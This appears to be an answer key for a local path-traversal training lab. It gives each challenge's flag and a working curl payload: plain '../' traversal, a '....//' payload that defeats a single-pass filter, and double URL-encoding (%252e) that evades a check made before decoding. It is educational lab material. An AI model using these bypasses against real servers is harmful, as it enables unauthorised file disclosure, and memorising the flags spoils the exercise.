NOTE: Each challenge uses a different base directory (public/, shared/,
archive/) and targets a different flag file. While cross-reading other
flag files is technically possible via traversal, the educational value
is in practicing each specific bypass technique against its endpoint.

CHALLENGE 1: Basic Path Traversal
Flag: FLAG{tr4v3rs4l_b4s1c}

  The /view endpoint reads files from documents/public/ with no sanitization.

  curl "http://localhost:5009/view?file=../../secret/flag.txt"

-------------------------------------------------------------------------------

CHALLENGE 2: Single-Pass Filter Bypass
Flag: FLAG{tr4v3rs4l_3nc0d1ng}

  The /view-filtered endpoint reads from documents/shared/ and does
  file.replace("../", "") but only in a single pass. Use ....// which
  becomes ../ after the replacement.

  curl "http://localhost:5009/view-filtered?file=....//....//secret/flag2.txt"

  After single-pass removal of "../":
    ....// -> ../ (the outer ../ remains after inner ../ is removed)

  Alternative: ..././..././secret/flag2.txt

-------------------------------------------------------------------------------

CHALLENGE 3: URL-Encoding Evasion
Flag: FLAG{tr4v3rs4l_3v4s10n}

  The /download endpoint reads from documents/archive/ and checks the raw
  parameter for ".." and "/etc" BEFORE URL-decoding it. URL-encode the
  dots to bypass the check.

  curl "http://localhost:5009/download?path=%252e%252e/%252e%252e/secret/flag3.txt"

  NOTE: Flask automatically URL-decodes query parameters before the code
  sees them, so single %2e%2e would be decoded to ".." and caught by the
  filter. You need DOUBLE encoding (%252e = %2e after Flask decodes, then
  urllib.parse.unquote() decodes %2e to ".").

  The flow: %252e%252e → Flask decodes to %2e%2e → check passes (no "..")
  → urllib.parse.unquote() decodes to ../../secret/flag3.txt

  The base path is documents/archive/ so you need two levels of ../
  to reach /app/secret/flag3.txt:
    documents/archive/../../secret/flag3.txt
